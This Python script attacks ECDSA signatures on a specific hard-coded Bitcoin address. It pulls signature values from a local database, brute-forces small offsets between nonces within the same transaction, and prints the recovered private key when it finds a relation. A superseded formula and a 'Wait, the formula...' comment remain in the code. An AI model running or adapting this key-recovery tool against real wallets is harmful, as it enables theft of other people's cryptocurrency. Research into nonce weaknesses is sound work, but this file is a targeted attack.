import sqlite3
import json
from ecdsa import SECP256k1, VerifyingKey

P = SECP256k1.order
G = SECP256k1.generator

def check_tx_nonces(address, target_pubkey_hex):
    conn = sqlite3.connect('cryscout.db')
    cursor = conn.cursor()
    cursor.execute('SELECT txid, r_hex, s_hex, z_hex FROM signatures WHERE address = ?', (address,))
    rows = cursor.fetchall()
    
    tx_map = {}
    for txid, r_hex, s_hex, z_hex in rows:
        tx_map.setdefault(txid, []).append({
            'r': int(r_hex, 16),
            's': int(s_hex, 16),
            'z': int(z_hex, 16)
        })
    
    pubkey_str = target_pubkey_hex
    if pubkey_str.startswith('0x'): pubkey_str = pubkey_str[2:]
    vk = VerifyingKey.from_string(bytes.fromhex(pubkey_str), curve=SECP256k1)
    Q = vk.pubkey.point

    print(f"Checking {len(tx_map)} transactions for intra-TX nonce relations...")
    
    for txid, sigs in tx_map.items():
        if len(sigs) < 2: continue
        
        # Check all pairs in the same TX
        for i in range(len(sigs)):
            for j in range(i + 1, len(sigs)):
                s1, s2 = sigs[i], sigs[j]
                
                # Check k1 = k2 + c
                p_diff = ((s1['r'] * s1['s'] - s2['r'] * s2['s']) % P) * Q + ((s1['z'] * s1['s'] - s2['z'] * s2['s']) % P) * G
                # Wait, the formula for k1 = k2 + c was:
                # d * (r1*s2 - r2*s1) = z2*s1 - z1*s2 + c*s2*s1
                
                r1, s1_val, z1 = s1['r'], s1['s'], s1['z']
                r2, s2_val, z2 = s2['r'], s2['s'], s2['z']
                
                # Correct formula:
                # P_diff = Q * (r1*s2 - r2*s1) + G * (z1*s2 - z2*s1)
                # P_base = G * (s2*s1)
                # Find c such that P_diff = c * P_base
                
                p_diff = ((r1 * s2_val - r2 * s1_val) % P) * Q + ((z1 * s2_val - z2 * s1_val) % P) * G
                p_base = ((s2_val * s1_val) % P) * G
                
                curr_p_base = p_base
                for c in range(1, 1000):
                    if (p_diff.x(), p_diff.y()) == (curr_p_base.x(), curr_p_base.y()):
                        num = (z2 * s1_val - z1 * s2_val + c * s2_val * s1_val) % P
                        den = (r1 * s2_val - r2 * s1_val) % P
                        d = (num * pow(den, -1, P)) % P
                        print(f"!!! FOUND REL IN TX {txid} !!!")
                        print(f"k_{i} = k_{j} + {c}")
                        print(f"Private Key: {hex(d)}")
                        return d
                    curr_p_base += p_base

    print("No intra-TX nonce relations found.")
    return None

if __name__ == "__main__":
    check_tx_nonces('15Z5YJaaNSxeynvr6uW6jQZLwq3n1Hu6RX', '047a51392bace353f4c3788c9c090ef4f635ec211159ec3b9f1bb7da7679517e126e98e0012bcb4d2b023c479afaaa1ad703ea1b24e1910e2cdad38744ba7aab8a')
